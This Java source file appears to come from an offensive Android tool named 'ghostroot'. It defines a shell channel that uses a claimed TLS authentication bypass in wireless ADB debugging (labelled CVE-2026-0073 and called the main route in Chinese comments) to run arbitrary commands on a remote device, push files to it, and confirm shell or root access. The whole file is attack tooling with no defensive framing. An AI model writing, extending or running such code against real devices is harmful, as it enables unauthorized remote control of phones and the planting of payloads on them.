package com.fuxi.ghostroot;

/**
 * Shell 通道实现之一：CVE-2026-0073（TLS 认证绕过）。
 *
 * 通过 Adb0073 的无线调试 socket 在 shell 域执行命令。
 * 这是主路。
 */
public class Adb0073Shell implements Shell {

    private final String host;
    private final int port;
    private final Adb0073 adb = new Adb0073();

    public Adb0073Shell(String host, int port) {
        this.host = host;
        this.port = port;
    }

    @Override public String name() { return "0073"; }

    @Override public String exec(String cmd) {
        return adb.run(host, port, cmd);
    }

    @Override public String log() {
        String l = adb.log();
        return l == null ? "" : l;
    }

    @Override public boolean push(byte[] data, String remote) {
        String r = adb.pushRaw(host, port, data, remote);
        // 至少等一会儿让远端把管道读完（原有逻辑依赖这个 sleep）
        try { Thread.sleep(5000); } catch (Throwable ignored) {}
        if (r == null) return false;
        // 校验大小
        String chk = adb.run(host, port,
                "stat -c %s " + remote + " 2>/dev/null");
        if (chk == null) return false;
        return chk.indexOf(String.valueOf(data.length)) >= 0;
    }

    @Override public boolean verify() {
        String id = adb.run(host, port, "id");
        return id != null && (id.indexOf("uid=2000") >= 0 || id.indexOf("uid=0") >= 0);
    }

    @Override public void close() {
        // 0073 的实现是每次 run 都开新连接，无需特别清理
    }
}